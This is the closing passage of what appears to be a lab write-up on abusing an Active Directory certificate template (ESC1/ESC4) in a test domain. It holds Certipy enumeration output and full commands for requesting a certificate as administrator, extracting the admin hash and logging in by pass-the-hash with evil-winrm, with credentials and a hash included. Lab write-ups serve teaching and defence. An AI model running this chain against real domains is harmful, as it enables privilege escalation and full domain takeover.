        Enroll                          : NARA-SECURITY.COM\Authenticated Users
Certificate Templates
  0
    Template Name                       : NaraUser
    Display Name                        : NaraUser
    Certificate Authorities             : NARA-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : UserInteractionRequired
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Domain Users
                                          NARA-SECURITY.COM\Enterprise Admins
      Object Control Permissions
        Owner                           : NARA-SECURITY.COM\Administrator
        Full Control Principals         : NARA-SECURITY.COM\Enrollment
        Write Owner Principals          : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
        Write Dacl Principals           : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
        Write Property Principals       : NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
                                          NARA-SECURITY.COM\Administrator
                                          NARA-SECURITY.COM\Enrollment
    [!] Vulnerabilities
      ESC1                              : 'NARA-SECURITY.COM\\Domain Users' and 'NARA-SECURITY.COM\\Enrollment' can enroll, enrollee supplies subject and template allows client authentication
      ESC4                              : 'NARA-SECURITY.COM\\Enrollment' has dangerous permissions

```

- However trying to request a certificate file `.pfx` i keep getting this error, although the goal is to keep trying till it works, but after numerous attempt this didn't work for me. I mean i just made this blog so you can understand how this works.

```bash
❯ certipy req -username JODIE.SUMMERS -password hHO_S9gff7ehXw -target nara-security.com -ca NARA-CA -template NaraUser -upn administrator@nara-security.com -dc-ip 192.168.220.30 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'nara-security.com' at '192.168.220.30'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.220.30[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.220.30[\pipe\cert]
[-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.
[*] Request ID is 25
Would you like to save the private key? (y/N) 
[-] Failed to request certificate
```

- If you want you can check this video of a friend exploiting the certificate template on a live stream by [Ye Zeiya Shein](https://www.youtube.com/watch?v=sQgsRfmMus8)

```bash
certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.220.30

# Gives administrator hash
```

- You can then pass-the-hash using the `evil-winrm` utility in kali as the user administrator

```bash
❯ evil-winrm -i 192.168.220.30 -u administrator -H d35c4ae45bdd10a4e28ff529a2155745
                                        
--SNIP--
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>


